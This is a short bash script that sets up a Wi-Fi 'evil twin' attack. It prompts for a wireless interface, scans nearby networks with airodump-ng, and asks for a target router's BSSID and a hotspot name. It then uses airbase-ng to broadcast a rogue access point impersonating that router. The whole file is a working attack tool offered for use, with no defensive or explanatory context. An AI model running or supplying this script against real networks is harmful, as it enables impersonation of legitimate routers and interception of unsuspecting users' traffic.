#! /bin/bash
echo "Please enter your Wireless Interface: "
read INT
sleep 1
echo "A scan will start, please choose the BSSID of the router you wish to copy: "
sleep 2
sudo airodump-ng $INT 
sleep 1
echo "Enter the BSSID or the router, then the name of the Evil twin's hotspot"
read BSSID
read NAME 
sudo airbase-ng -a $BSSID -e $NAME -c 6 $INT 
